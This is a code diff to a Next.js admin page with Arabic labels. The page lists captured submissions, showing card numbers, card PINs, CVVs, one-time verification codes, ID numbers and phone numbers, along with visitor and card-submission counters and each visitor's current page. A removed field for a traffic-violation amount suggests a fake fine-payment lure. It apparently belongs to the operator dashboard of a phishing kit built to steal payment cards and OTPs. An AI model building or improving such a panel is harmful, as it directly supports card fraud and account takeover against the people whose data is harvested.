@@ -75,7 +75,6 @@ export default function NotificationsPage() {
   const [message, setMessage] = useState<boolean>(false)
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
-  const [onlineUsers, setOnlineUsers] = useState<number>(0)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
   const router = useRouter()
@@ -283,7 +282,7 @@ export default function NotificationsPage() {
           </div>
         </div>
 
-        {/* Statistics Grid */}
+        {/* cs Grid */}
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
           {/* Online Users Card */}
           <div className="bg-white rounded-lg shadow p-4 flex items-center">
@@ -342,13 +341,7 @@ export default function NotificationsPage() {
                     <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
                     <td className="px-4 py-3">
                       <div className="flex flex-col sm:flex-row gap-2">
-                        <Badge
-                          variant={notification.personalInfo?.id! ? "default" : "destructive"}
-                          className="rounded-md cursor-pointer"
-                          onClick={() => handleInfoClick(notification, "personal")}
-                        >
-                          {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
-                        </Badge>
+                      
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
                           className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
@@ -357,8 +350,8 @@ export default function NotificationsPage() {
                           {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
                         <Badge
-                          variant={"secondary"}
-                          className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
+                          variant={notification.idNumber ?"default":"secondary"}
+                          className={`rounded-md cursor-pointer ${notification.idNumber ? "bg-fuchsia-500" : ""}`}
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
                           <InfoIcon className="h-4 w-4 mr-1" />
@@ -366,7 +359,7 @@ export default function NotificationsPage() {
                         </Badge>
                       </div>
                     </td>
-                    <td className="px-4 py-3">خطوه - {notification.page}</td>
+                    <td className="px-4 py-3"> {notification.currentPage}</td>
                     <td className="px-4 py-3">
                       {notification.createdDate &&
                         formatDistanceToNow(new Date(notification.createdDate), {
@@ -422,28 +415,23 @@ export default function NotificationsPage() {
 
                 <div className="grid grid-cols-1 gap-2 mb-3">
                   <div className="flex flex-wrap gap-2">
-                    <Badge
-                      variant={notification.personalInfo?.id! ? "default" : "destructive"}
-                      className="rounded-md cursor-pointer"
-                      onClick={() => handleInfoClick(notification, "personal")}
-                    >
-                      {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
-                    </Badge>
-                    <Badge
+                  <Badge
                       variant={notification.cardNumber ? "default" : "destructive"}
                       className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                       onClick={() => handleInfoClick(notification, "card")}
                     >
                       {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                     </Badge>
+                  
                     <Badge
-                      variant={"secondary"}
-                      className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
+                      variant={notification.idNumber? "default":"destructive"}
+                      className={`rounded-md cursor-pointer ${notification.idNumber ? "bg-fuchsia-500" : ""}`}
                       onClick={() => handleInfoClick(notification, "personal")}
                     >
                       <InfoIcon className="h-4 w-4 mr-1" />
                       معلومات عامة
-                    </Badge>
+                    </Badge>  
+                    
                   </div>
 
                   <div className="text-sm">
@@ -493,7 +481,7 @@ export default function NotificationsPage() {
                   : "تفاصيل المعلومات العامة"}
             </DialogDescription>
           </DialogHeader>
-          {selectedInfo === "personal" && selectedNotification?.plateType && (
+          {selectedInfo === "personal" && selectedNotification?.mobile && (
             <div className="space-y-2">
               <p>
                 <strong>رقم الهوية:</strong> {selectedNotification.idNumber}
@@ -519,7 +507,7 @@ export default function NotificationsPage() {
                 <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
               <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp2!}
+                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp!}
               </p> 
                <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
@@ -529,7 +517,7 @@ export default function NotificationsPage() {
           {selectedInfo === "personal" && selectedNotification && (
             <div className="space-y-2">
               <p>
-                <strong>الهاتف:</strong> {selectedNotification.mobile}
+                <strong>الهاتف:</strong> {selectedNotification.phoneNumber}
               </p>
               <p>
                 <strong>رقم الهوية</strong> {selectedNotification.idNumber}
@@ -538,10 +526,9 @@ export default function NotificationsPage() {
                 <strong>نوع الشبكة :</strong> {selectedNotification.network}
               </p>{" "}
               <p>
-                <strong>قيمة المخالفة :</strong> {selectedNotification.violationValue}
               </p>{" "}
               <p>
-                <strong>رمز التحقق المرسل :</strong> {selectedNotification.otp}
+                <strong>رمز التحقق المرسل :</strong> {selectedNotification.finalOtp}
               </p>
               <div className="flex justify-between mx-1">
                 <Button
